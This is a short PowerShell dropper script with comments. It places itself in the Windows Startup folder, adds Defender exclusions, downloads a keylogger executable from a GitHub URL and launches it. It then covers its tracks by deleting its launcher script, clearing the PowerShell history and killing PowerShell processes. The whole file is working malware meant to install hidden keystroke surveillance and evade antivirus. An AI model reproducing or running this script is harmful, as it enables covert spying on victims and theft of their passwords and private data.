Set-Location $env:AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://github.com/nhorv/keylog/raw/main/keylogger.exe -O keylogger.exe #Download keylogger script
Add-MpPreference -ExclusionPath $env:AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
Start-Process keylogger.exe #Start keylogger script
Remove-MpPreference -ExclusionExtension exe -Force #Reset .exe files exception in antivirus
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
Set-ExecutionPolicy restricted -Force #Reset script execution policy
Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
